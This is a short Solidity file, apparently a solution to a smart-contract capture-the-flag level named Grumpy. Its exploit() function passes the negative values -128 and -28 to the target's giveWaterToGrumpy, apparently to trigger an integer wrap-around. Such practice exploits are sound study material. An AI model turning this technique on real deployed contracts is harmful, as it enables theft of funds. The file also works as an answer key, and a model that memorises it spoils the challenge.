// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/hardChalls/Grumpy.sol";

contract GrumpyAttack {

    Grumpy originalContract;

    constructor(address payable _originalContract) public {
        originalContract = Grumpy(_originalContract);
    }

    function exploit() public {
        originalContract.giveWaterToGrumpy(-128);
        originalContract.giveWaterToGrumpy(-28);
    }

}